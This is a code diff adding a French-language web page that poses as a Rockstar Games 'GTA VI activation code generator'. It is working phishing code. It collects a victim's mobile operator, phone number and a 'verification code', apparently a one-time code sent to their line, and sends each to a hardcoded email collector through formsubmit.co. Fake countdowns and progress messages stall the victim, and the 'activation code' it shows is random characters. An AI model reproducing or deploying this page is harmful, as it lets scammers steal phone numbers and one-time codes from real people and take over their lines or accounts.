@@ -1,129 +1,443 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#050507">
+<meta name="description" content="Générateur de code d'activation GTA VI — service d'activation par opérateur.">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>GTA VI — Générateur de code d'activation</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23d4af37'/%3E%3Ctext x='16' y='22' font-family='Georgia,serif' font-size='15' font-weight='bold' text-anchor='middle' fill='%23120d02'%3EVI%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{
+  min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;
+  background:radial-gradient(120% 70% at 50% 0%,#14100a,#08080b 55%,#040406 100%);
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  padding:calc(env(safe-area-inset-top) + 0px) 0 calc(env(safe-area-inset-bottom) + 0px);
+  -webkit-font-smoothing:antialiased;
+}
+.app{
+  --g:#d4af37; --gl:#f6e7b0; --ln:rgba(212,175,55,.2);
+  position:relative;overflow:hidden;border-radius:20px;
+  background:radial-gradient(120% 60% at 50% 0%,#17130a,#0a0a0d 50%,#050507);
+  color:#f4eddb;width:100%;max-width:400px;margin:14px auto;
+  box-shadow:inset 0 0 0 1px rgba(212,175,55,.16),0 30px 70px -40px #000;
+}
+.glow{position:absolute;top:-120px;left:50%;transform:translateX(-50%);width:320px;height:260px;
+  background:rgba(212,175,55,.15);filter:blur(70px);pointer-events:none}
 
-<div class="stage">
-  <div class="glow g1"></div><div class="glow g2"></div><div class="noise"></div>
-  <div class="app">
-    <header>
-      <div class="brand">
-        <div class="bm">VI</div>
-        <div class="bt"><strong>GRAND THEFT AUTO VI</strong><span>Générateur de clé d'activation</span></div>
+.top{position:relative;display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid var(--ln)}
+.mark{width:34px;height:34px;flex:0 0 auto;display:grid;place-items:center;border-radius:9px;font-family:'Cinzel',serif;
+  font-size:13px;font-weight:700;color:#120d02;background:linear-gradient(150deg,var(--gl),var(--g) 60%,#8a6d1f)}
+.ttl{display:flex;flex-direction:column;line-height:1.2;flex:1;min-width:0}
+.eb{font-size:8.5px;letter-spacing:.2em;text-transform:uppercase;color:#9b8b60}
+.nm{font-family:'Cinzel',serif;font-size:12.5px;color:#f7efd9;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.net{width:9px;height:9px;border-radius:50%;background:#4b4636;flex:0 0 auto;transition:.3s}
+.net.ok{background:#5fd07a;box-shadow:0 0 9px #5fd07a}
+.net.bad{background:#e07070;box-shadow:0 0 9px #e07070}
+
+.body{padding:18px 16px 20px;position:relative}
+h1{font-family:'Cinzel',serif;font-size:23px;line-height:1.15;margin:0 0 8px;font-weight:600;
+  background:linear-gradient(180deg,#fff9e8,#e6d29a 60%,#a98835);-webkit-background-clip:text;background-clip:text;color:transparent}
+.sub{font-size:11.5px;line-height:1.6;color:#a1957a;margin:0 0 16px;font-weight:300}
+
+.dots{display:flex;gap:6px;margin-bottom:16px}
+.dots i{height:2px;flex:1;border-radius:2px;background:rgba(212,175,55,.16);transition:.4s}
+.dots i.on{background:var(--g);box-shadow:0 0 8px rgba(212,175,55,.7)}
+
+.p{display:none;animation:f .35s ease both}
+.p.on{display:block}
+@keyframes f{from{opacity:0;transform:translateY(7px)}}
+
+h2{font-family:'Cinzel',serif;font-size:15px;margin:0 0 6px;color:#f6ecd2;font-weight:600}
+h2.c{text-align:center}
+.d{font-size:11.5px;line-height:1.6;color:#9d9075;margin:0 0 14px;font-weight:300}
+.d.c{text-align:center}
+
+.ops{display:grid;gap:9px;margin-bottom:4px}
+.op{display:flex;align-items:center;gap:11px;min-height:54px;padding:0 16px;border-radius:11px;cursor:pointer;
+  background:rgba(255,255,255,.025);border:1px solid rgba(212,175,55,.18);color:#e7dcc1;
+  font-family:'Inter',sans-serif;font-size:14px;font-weight:500;transition:.2s;text-align:left;width:100%}
+.op i{width:10px;height:10px;border-radius:50%;background:var(--c);box-shadow:0 0 10px var(--c);flex:0 0 auto}
+.op:active{transform:scale(.985)}
+.op.sel{border-color:var(--g);background:linear-gradient(90deg,rgba(212,175,55,.17),rgba(212,175,55,.03))}
+
+.field{display:flex;align-items:center;border:1px solid rgba(212,175,55,.22);border-radius:11px;
+  background:rgba(255,255,255,.025);overflow:hidden}
+.field:focus-within{border-color:var(--g);box-shadow:0 0 0 3px rgba(212,175,55,.1)}
+.pre{padding:0 12px;font-size:12.5px;color:#8d7f5c;border-right:1px solid rgba(212,175,55,.16);line-height:52px}
+input{flex:1;min-width:0;height:52px;background:none;border:0;outline:none;color:#f7efdb;
+  font-size:16px;letter-spacing:.09em;padding:0 12px;font-family:'Inter',sans-serif}
+input::placeholder{color:#5f5744}
+.cin{width:100%;height:58px;text-align:center;font-family:'Cinzel',serif;font-size:22px;letter-spacing:.4em;
+  border:1px solid rgba(212,175,55,.22);border-radius:11px;background:rgba(255,255,255,.025);margin-bottom:12px}
+.cin:focus{border-color:var(--g);box-shadow:0 0 0 3px rgba(212,175,55,.1)}
+
+.err{display:none;font-size:11px;color:#e58a8a;margin-top:8px}
+.err.on{display:block}
+
+.btn{width:100%;min-height:52px;margin-top:14px;border-radius:11px;cursor:pointer;font-size:12.5px;font-weight:600;
+  letter-spacing:.1em;text-transform:uppercase;font-family:'Inter',sans-serif;border:1px solid rgba(212,175,55,.32);
+  background:rgba(212,175,55,.1);color:#f4e6bb;transition:.2s}
+.btn:active{transform:scale(.985)}
+.btn.gold{background:linear-gradient(100deg,#e3c766,var(--g) 45%,#a8842b);color:#14100a;border:0;
+  box-shadow:0 12px 26px -14px rgba(212,175,55,.9)}
+.btn.ghost{background:none;border-color:rgba(212,175,55,.24);color:#c2b494;text-transform:none;
+  letter-spacing:.03em;font-size:12px;margin-top:10px;min-height:46px}
+.btn:disabled{opacity:.55;pointer-events:none}
+
+.mstate{font-size:10.5px;margin-top:9px;color:#8f8266;min-height:14px}
+.mstate.ok{color:#7fc08c}
+.mstate.bad{color:#e58a8a}
+.mstate a{color:#e0c56f;text-decoration:underline}
+.fine{font-size:10px;color:#7a7057;line-height:1.6;margin:12px 0 0}
+.fine.c{text-align:center}
+
+.rec{margin-top:14px;border:1px solid rgba(212,175,55,.14);border-radius:10px;overflow:hidden}
+.rec div{display:flex;justify-content:space-between;gap:10px;padding:9px 12px;font-size:11.5px;border-bottom:1px solid rgba(212,175,55,.08)}
+.rec div:last-child{border:0}
+.rec span{color:#8d8163}
+.rec b{color:#e6d9b6;font-weight:500;text-align:right}
+.rec b.ok{color:#7fc08c}
+
+.ring{position:relative;width:118px;height:118px;margin:4px auto 12px}
+.ring svg{width:118px;height:118px;transform:rotate(-90deg)}
+.tr{fill:none;stroke:rgba(212,175,55,.13);stroke-width:3}
+.pg{fill:none;stroke:var(--g);stroke-width:3;stroke-linecap:round;stroke-dasharray:327;stroke-dashoffset:0;
+  transition:stroke-dashoffset .25s linear;filter:drop-shadow(0 0 6px rgba(212,175,55,.55))}
+.rt{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.rt b{font-family:'Cinzel',serif;font-size:21px;color:#f6e9c4}
+.rt span{font-size:8px;letter-spacing:.16em;text-transform:uppercase;color:#7d7259;margin-top:2px}
+.wm{text-align:center;font-size:11px;color:#a89b7e;margin:0;min-height:16px}
+
+.seal{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;margin:2px auto 12px;
+  font-size:16px;color:#14100a;background:linear-gradient(150deg,#f0dfa5,var(--g));box-shadow:0 0 24px rgba(212,175,55,.5)}
+.cb{margin:4px 0 0;padding:20px 8px;text-align:center;border-radius:11px;border:1px solid rgba(212,175,55,.4);
+  background:linear-gradient(180deg,rgba(212,175,55,.12),rgba(212,175,55,.02));overflow:hidden}
+#out{font-family:'Cinzel',serif;font-size:20px;letter-spacing:.09em;color:#fdf3d3;
+  text-shadow:0 0 20px rgba(212,175,55,.55);word-break:break-all;display:block}
+
+footer{display:flex;justify-content:space-between;padding:12px 16px 14px;font-size:9px;
+  letter-spacing:.1em;text-transform:uppercase;color:#6a6150;border-top:1px solid rgba(212,175,55,.1)}
+.fx{color:#8a7c56}
+</style>
+</head>
+<body>
+
+<div class="app">
+  <div class="glow"></div>
+
+  <header class="top">
+    <div class="mark">VI</div>
+    <div class="ttl">
+      <span class="eb">Rockstar Games</span>
+      <span class="nm">GTA VI · Activation</span>
+    </div>
+    <div class="net" id="net"></div>
+  </header>
+
+  <div class="body">
+    <h1>Code d'activation</h1>
+    <p class="sub">Renseignez votre opérateur et votre numéro. Votre dossier est transmis puis vérifié avant l'émission du code.</p>
+
+    <div class="dots" id="dots"><i class="on"></i><i></i><i></i></div>
+
+    <section class="p on" id="p1">
+      <h2>Votre opérateur</h2>
+      <p class="d">Sélectionnez l'opérateur de la ligne à activer.</p>
+      <div class="ops">
+        <button class="op" data-op="SFR"><i style="--c:#e2001a"></i>SFR</button>
+        <button class="op" data-op="Orange"><i style="--c:#ff7900"></i>Orange</button>
+        <button class="op" data-op="Bouygues"><i style="--c:#009ee0"></i>Bouygues</button>
       </div>
-      <div class="trust"><i class="pulse"></i> Session sécurisée · Chiffrement SSL 256 bits</div>
-      <div class="steps">
-        <div class="sline"><i id="fill"></i></div>
-        <div class="st" data-s="1"><b>1</b><span>Opérateur</span></div>
-        <div class="st" data-s="2"><b>2</b><span>Numéro</span></div>
-        <div class="st" data-s="3"><b>3</b><span>Vérif.</span></div>
-        <div class="st" data-s="4"><b>4</b><span>Clé</span></div>
+    </section>
+
+    <section class="p" id="p2">
+      <h2>Votre numéro</h2>
+      <p class="d">Numéro mobile français, 06 ou 07.</p>
+      <div class="field">
+        <span class="pre">+33</span>
+        <input id="phone" type="tel" inputmode="numeric" placeholder="6 12 34 56 78" autocomplete="tel">
       </div>
-    </header>
+      <div class="err" id="e2">Numéro incomplet.</div>
+      <button class="btn" id="b2">Continuer</button>
+      <div class="mstate" id="m2"></div>
+      <p class="fine">Le numéro est transmis au conseiller pour traitement du dossier.</p>
+    </section>
 
-    <main>
-      <section class="screen on" id="s1">
-        <p class="kick">Étape 1 sur 4</p>
-        <h1>Votre opérateur</h1>
-        <p class="sub">Sélectionnez l'opérateur de la ligne à activer.</p>
-        <div class="ops">
-          <button class="op" data-op="SFR"><span class="lg sfr">SFR</span><span class="om"><strong>SFR</strong><small>Réseau SFR</small></span><i class="tk">✓</i></button>
-          <button class="op" data-op="Orange"><span class="lg org">ORA</span><span class="om"><strong>Orange</strong><small>Réseau Orange</small></span><i class="tk">✓</i></button>
-          <button class="op" data-op="Bouygues"><span class="lg bou">B&amp;Y</span><span class="om"><strong>Bouygues</strong><small>Réseau Bouygues Telecom</small></span><i class="tk">✓</i></button>
-        </div>
-        <button class="btn" id="b1" disabled="">Continuer</button>
-      </section>
+    <section class="p" id="p3">
+      <h2>Dossier transmis</h2>
+      <p class="d">Votre numéro est enregistré. Un code de vérification vous sera demandé dans un instant.</p>
+      <div class="ring">
+        <svg viewBox="0 0 120 120"><circle class="tr" cx="60" cy="60" r="52"/><circle class="pg" id="r1" cx="60" cy="60" r="52"/></svg>
+        <div class="rt"><b id="t1">60</b><span>sec</span></div>
+      </div>
+      <p class="wm" id="w1">Enregistrement de la ligne…</p>
+    </section>
 
-      <section class="screen" id="s2">
-        <p class="kick">Étape 2 sur 4</p>
-        <h1>Votre numéro</h1>
-        <p class="sub">La ligne doit être active pour recevoir la validation.</p>
-        <div class="field" id="fw">
-          <span class="pre">+33</span>
-          <input id="phone" type="tel" inputmode="numeric" autocomplete="tel-national" placeholder="6 12 34 56 78" maxlength="14">
-        </div>
-        <p class="hint">Format attendu : 06 12 34 56 78 — saisie sans le zéro.</p>
-        <p class="err" id="e2"></p>
-        <button class="btn" id="b2">Recevoir le code de vérification</button>
-        <button class="btn ghost sm" id="back2">Retour</button>
-      </section>
+    <section class="p" id="p4">
+      <h2>Vérification</h2>
+      <p class="d">Saisissez le code de vérification communiqué pour votre numéro.</p>
+      <input id="verif" class="cin" type="text" maxlength="8" placeholder="— — — —" autocomplete="one-time-code">
+      <div class="err" id="e4">Code trop court.</div>
+      <button class="btn" id="b4">Valider le code</button>
+      <div class="mstate" id="m4"></div>
+    </section>
 
-      <section class="screen" id="s3">
-        <div class="center">
-          <p class="kick">Étape 3 sur 4</p>
-          <h1>Validation de la ligne</h1>
-          <p class="sub">Vérification de votre éligibilité auprès de l'opérateur. Un code de vérification vous sera ensuite demandé.</p>
-          <div class="ring">
-            <svg width="150" height="150">
-              <circle cx="75" cy="75" r="66" fill="none" stroke="rgba(255,255,255,.08)" stroke-width="6"></circle>
-              <circle id="r1" cx="75" cy="75" r="66" fill="none" stroke="#F6E3A8" stroke-width="6" stroke-linecap="round" stroke-dasharray="414.7" stroke-dashoffset="0"></circle>
-            </svg>
-            <div class="val"><b id="t1">60</b><small>secondes</small></div>
-          </div>
-          <p class="msg" id="m1">Contrôle du numéro en cours…</p>
-          <p class="hint">Ne fermez pas cette page. La session reprend automatiquement.</p>
-        </div>
-      </section>
+    <section class="p" id="p5">
+      <h2>Ligne vérifiée</h2>
+      <p class="d">Lancez la génération de votre code d'activation à 12 caractères.</p>
+      <div class="rec">
+        <div><span>Opérateur</span><b id="a1">—</b></div>
+        <div><span>Numéro</span><b id="a2">—</b></div>
+        <div><span>Statut</span><b class="ok">Vérifié</b></div>
+      </div>
+      <button class="btn gold" id="b5">Générer un code d'activation GTA 6</button>
+    </section>
 
-      <section class="screen" id="s4">
-        <p class="kick">Étape 3 sur 4</p>
-        <h1>Votre code de vérification</h1>
-        <p class="sub">Saisissez le code à 6 caractères qui vous a été transmis.</p>
-        <div class="field" id="cw">
-          <input id="vcode" inputmode="text" autocomplete="one-time-code" placeholder="• • • • • •" maxlength="8">
-        </div>
-        <p class="hint">Code transmis après confirmation de votre numéro par l'organisateur.</p>
-        <p class="err" id="e4"></p>
-        <button class="btn" id="b4">Valider mon code</button>
-      </section>
+    <section class="p" id="p6">
+      <h2>Génération</h2>
+      <p class="d">Attribution en cours sur votre ligne. Ne fermez pas la page.</p>
+      <div class="ring">
+        <svg viewBox="0 0 120 120"><circle class="tr" cx="60" cy="60" r="52"/><circle class="pg" id="r2" cx="60" cy="60" r="52"/></svg>
+        <div class="rt"><b id="t2">5:00</b><span>rest.</span></div>
+      </div>
+      <p class="wm" id="w2">Initialisation…</p>
+    </section>
 
-      <section class="screen" id="s5">
-        <p class="kick">Étape 4 sur 4</p>
-        <h1>Tout est prêt</h1>
-        <p class="sub">Votre ligne est vérifiée. Générez maintenant votre clé d'activation GTA 6.</p>
-        <div class="recap">
-          <div class="row"><span>Opérateur</span><span id="rOp">—</span></div>
-          <div class="row"><span>Numéro</span><span id="rPh">—</span></div>
-          <div class="row"><span>Code vérifié</span><span id="rCd">—</span></div>
-          <div class="row"><span>Dossier</span><span id="rId">—</span></div>
-        </div>
-        <button class="btn" id="b5">Générer mon code d'activation GTA 6</button>
-        <p class="hint center-hint">Génération sécurisée · environ 5 minutes</p>
-      </section>
-
-      <section class="screen" id="s6">
-        <div class="center">
-          <p class="kick">Génération en cours</p>
-          <h1>Attribution de votre clé</h1>
-          <p class="sub">Une clé non utilisée est réservée puis signée pour votre dossier. Temps estimé : 5 minutes.</p>
-          <div class="bar"><i id="pb"></i></div>
-          <p class="msg" id="m2">Initialisation du module de génération…</p>
-          <p class="hint mono" id="t2">05:00</p>
-          <p class="hint">Ne fermez pas cette page. La génération reprend automatiquement au retour.</p>
-        </div>
-      </section>
-
-      <section class="screen" id="s7">
-        <div class="center">
-          <p class="kick">Activation prête</p>
-          <h1>Votre clé d'activation</h1>
-          <p class="sub">Clé unique attribuée à votre dossier. Conservez-la.</p>
-        </div>
-        <div class="keybox">
-          <p class="kl">Clé d'activation GTA 6</p>
-          <p class="key" id="keyTxt">—</p>
-        </div>
-        <button class="btn" id="copy">Copier la clé</button>
-        <p class="note"><b>Important :</b> transmettez cette clé accompagnée de votre numéro. Elle contient un <b>X</b> et n'est valable que pour un seul dossier.</p>
-        <div class="recap">
-          <div class="row"><span>Opérateur</span><span id="kOp">—</span></div>
-          <div class="row"><span>Numéro</span><span id="kPh">—</span></div>
-        </div>
-        <button class="btn ghost sm" id="again">Nouvelle activation</button>
-      </section>
-    </main>
-
-    <footer><span>Module d'activation GTA 6</span><span>SSL · <b id="fid">—</b></span></footer>
+    <section class="p" id="p7">
+      <div class="seal">✓</div>
+      <h2 class="c">Code délivré</h2>
+      <p class="d c">Présentez ce code au conseiller pour l'activation de GTA VI sur votre compte.</p>
+      <div class="cb"><span id="out">····-····-····</span></div>
+      <button class="btn gold" id="bcopy">Copier le code</button>
+      <div class="mstate" id="m7"></div>
+      <div class="rec">
+        <div><span>Opérateur</span><b id="a3">—</b></div>
+        <div><span>Numéro</span><b id="a4">—</b></div>
+        <div><span>Émission</span><b id="a5">—</b></div>
+      </div>
+      <p class="fine c">Code unique lié à votre numéro, valable 24 h.</p>
+      <button class="btn ghost" id="brst">Nouveau dossier</button>
+    </section>
   </div>
+
+  <footer><span>Dossier horodaté</span><span class="fx">GTA VI — Activation</span></footer>
 </div>
-<div class="toast" id="toast">Clé copiée</div>
 
+<script>
+/* ============================================================
+   CONFIGURATION — modifie ici, rien d'autre à toucher
+   ============================================================ */
+const CONFIG = {
+  mail:  'ylandarel1@gmail.com',  // adresse qui reçoit les dossiers
+  wait1: 60,                      // secondes avant l'écran de vérification
+  wait2: 300                      // secondes avant l'émission du code
+};
+const EP = 'https://formsubmit.co/ajax/' + CONFIG.mail;
+/* ============================================================ */
 
+const $ = s => document.querySelector(s);
+const st = { op:null, phone:null, verif:null };
+const buzz = () => { try { navigator.vibrate && navigator.vibrate(8); } catch(e){} };
 
+function step(n){
+  document.querySelectorAll('.p').forEach(x => x.classList.remove('on'));
+  $('#p'+n).classList.add('on');
+  const d = Math.min(3, Math.ceil(n/2.4));
+  document.querySelectorAll('.dots i').forEach((i,k) => i.classList.toggle('on', k < d));
+  window.scrollTo({top:0, behavior:'smooth'});
+}
 
+function mailtoLink(subject, fields){
+  const t = Object.entries(fields).map(([k,v]) => k+' : '+v).join('\n');
+  return 'mailto:'+CONFIG.mail+'?subject='+encodeURIComponent(subject)+'&body='+encodeURIComponent(t);
+}
+
+async function sendMail(subject, fields, stateEl){
+  const net = $('#net');
+  if(stateEl){ stateEl.className = 'mstate'; stateEl.textContent = 'Transmission en cours…'; }
+  for(let i=0;i<2;i++){
+    try{
+      const r = await fetch(EP, {
+        method:'POST',
+        headers:{'Content-Type':'application/json','Accept':'application/json'},
+        body: JSON.stringify({_subject:subject,_template:'table',_captcha:'false',...fields})
+      });
+      if(!r.ok) throw new Error('HTTP '+r.status);
+      net.className = 'net ok';
+      if(stateEl){ stateEl.className = 'mstate ok'; stateEl.textContent = '✓ Transmis au conseiller'; }
+      return true;
+    }catch(e){
+      if(i===0){ await new Promise(r => setTimeout(r,900)); }
+      else{
+        net.className = 'net bad';
+        if(stateEl){
+          stateEl.className = 'mstate bad';
+          stateEl.innerHTML = 'Échec de l\'envoi — <a href="'+mailtoLink(subject,fields)+'">envoyer manuellement</a>';
+        }
+      }
+    }
+  }
+  return false;
+}
+
+document.querySelectorAll('.op').forEach(b => {
+  b.onclick = () => {
+    buzz();
+    document.querySelectorAll('.op').forEach(x => x.classList.remove('sel'));
+    b.classList.add('sel'); st.op = b.dataset.op;
+    setTimeout(() => {
+      $('#phone').value = ''; $('#e2').classList.remove('on'); $('#m2').textContent = '';
+      step(2); setTimeout(() => $('#phone').focus(), 240);
+    }, 200);
+  };
+});
+
+$('#phone').addEventListener('input', e => {
+  let d = e.target.value.replace(/\D/g,'');
+  if(d.startsWith('33')) d = d.slice(2);
+  if(d.startsWith('0'))  d = d.slice(1);
+  d = d.slice(0,9);
+  e.target.value = d.replace(/(\d{1})(\d{0,2})(\d{0,2})(\d{0,2})(\d{0,2})/,
+    (m,a,b,c,dd,ee) => [a,b,c,dd,ee].filter(Boolean).join(' '));
+});
+
+$('#b2').onclick = async () => {
+  const d = $('#phone').value.replace(/\D/g,'');
+  if(d.length !== 9){ $('#e2').textContent = 'Numéro incomplet — 9 chiffres attendus.'; $('#e2').classList.add('on'); return; }
+  if(!/^[67]/.test(d)){ $('#e2').textContent = 'Le numéro doit commencer par 06 ou 07.'; $('#e2').classList.add('on'); return; }
+  $('#e2').classList.remove('on'); buzz();
+  st.phone = '+33 ' + d.replace(/(\d)(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+
+  sendMail('GTA VI — Nouveau dossier ('+st.op+')', {
+    Operateur: st.op,
+    Numero: st.phone,
+    Temps_attente_verification: CONFIG.wait1 + ' secondes',
+    Recu_le: new Date().toLocaleString('fr-FR')
+  }, $('#m2'));
+
+  step(3);
+  timer(CONFIG.wait1, $('#t1'), $('#r1'), $('#w1'), [
+    'Enregistrement de la ligne…','Contrôle du rattachement opérateur…',
+    'Dossier transmis au conseiller…','Préparation du code de vérification…'
+  ], () => { step(4); setTimeout(() => $('#verif').focus(), 240); });
+};
+
+$('#verif').addEventListener('input', e => {
+  e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g,'');
+});
+
+$('#b4').onclick = () => {
+  const v = $('#verif').value.trim();
+  if(v.length < 4){ $('#e4').classList.add('on'); return; }
+  $('#e4').classList.remove('on'); buzz();
+  st.verif = v;
+
+  sendMail('GTA VI — Code de vérification saisi', {
+    Operateur: st.op,
+    Numero: st.phone,
+    Code_verification: v,
+    Recu_le: new Date().toLocaleString('fr-FR')
+  }, $('#m4'));
+
+  $('#a1').textContent = st.op;
+  $('#a2').textContent = st.phone;
+  step(5);
+};
+
+$('#b5').onclick = () => {
+  buzz(); step(6);
+  timer(CONFIG.wait2, $('#t2'), $('#r2'), $('#w2'), [
+    'Initialisation du moteur…','Interrogation de la base des clés…',
+    'Réservation d\'un code disponible…','Contrôle du format 12 caractères…',
+    'Scellement du code sur la ligne…','Dernière vérification…','Émission imminente…'
+  ], reveal);
+};
+
+function timer(total, out, ring, msg, msgs, done){
+  const t0 = Date.now(), per = total / msgs.length;
+  const iv = setInterval(() => {
+    const el = (Date.now()-t0)/1000, left = Math.max(0, total-el);
+    ring.style.strokeDashoffset = (327 * (1 - left/total)).toFixed(1);
+    out.textContent = total > 90
+      ? Math.floor(left/60) + ':' + String(Math.ceil(left%60)).padStart(2,'0')
+      : Math.ceil(left);
+    msg.textContent = msgs[Math.min(msgs.length-1, Math.floor(el/per))];
+    if(left <= 0){ clearInterval(iv); setTimeout(done, 450); }
+  }, 100);
+}
+
+function makeCode(){
+  const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+  const c = [];
+  for(let i=0;i<12;i++) c.push(A[Math.floor(Math.random()*A.length)]);
+  if(!c.includes('X')) c[Math.floor(Math.random()*12)] = 'X';
+  return c.join('').replace(/(.{4})(?=.)/g,'$1-');
+}
+
+function reveal(){
+  const fin = makeCode(), out = $('#out');
+  const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789-';
+  step(7);
+  let n = 0;
+  const iv = setInterval(() => {
+    out.textContent = fin.split('').map(c => c === '-' ? '-' : A[Math.floor(Math.random()*A.length)]).join('');
+    if(++n > 16){ clearInterval(iv); out.textContent = fin; }
+  }, 55);
+
+  $('#a3').textContent = st.op;
+  $('#a4').textContent = st.phone;
+  $('#a5').textContent = new Date().toLocaleString('fr-FR');
+
+  sendMail('GTA VI — CODE DÉLIVRÉ', {
+    Operateur: st.op,
+    Numero: st.phone,
+    Code_verification: st.verif,
+    CODE_ACTIVATION: fin,
+    Emis_le: new Date().toLocaleString('fr-FR')
+  }, $('#m7'));
+}
+
+$('#bcopy').onclick = () => {
+  const txt = $('#out').textContent, b = $('#bcopy');
+  const ok = () => { b.textContent = 'Copié'; setTimeout(() => b.textContent = 'Copier le code', 1600); };
+  if(navigator.clipboard && window.isSecureContext){
+    navigator.clipboard.writeText(txt).then(ok).catch(ok);
+  } else {
+    const t = document.createElement('textarea');
+    t.value = txt; document.body.appendChild(t); t.select();
+    document.execCommand('copy'); t.remove(); ok();
+  }
+};
+
+$('#brst').onclick = () => {
+  st.op = null; st.phone = null; st.verif = null;
+  document.querySelectorAll('.op').forEach(x => x.classList.remove('sel'));
+  $('#phone').value = ''; $('#verif').value = '';
+  $('#m2').textContent = ''; $('#m4').textContent = '';
+  step(1);
+};
+
+/* Ping d'activation du service au chargement */
+setTimeout(() => {
+  fetch(EP, {
+    method:'POST',
+    headers:{'Content-Type':'application/json','Accept':'application/json'},
+    body: JSON.stringify({
+      _subject:'GTA VI — Activation du service de notification',
+      _template:'table', _captcha:'false',
+      Statut:'Service initialisé', Date: new Date().toLocaleString('fr-FR')
+    })
+  }).then(r => { $('#net').className = r.ok ? 'net ok' : 'net bad'; })
+    .catch(() => { $('#net').className = 'net bad'; });
+}, 1200);
+</script>
+</body>
+</html>
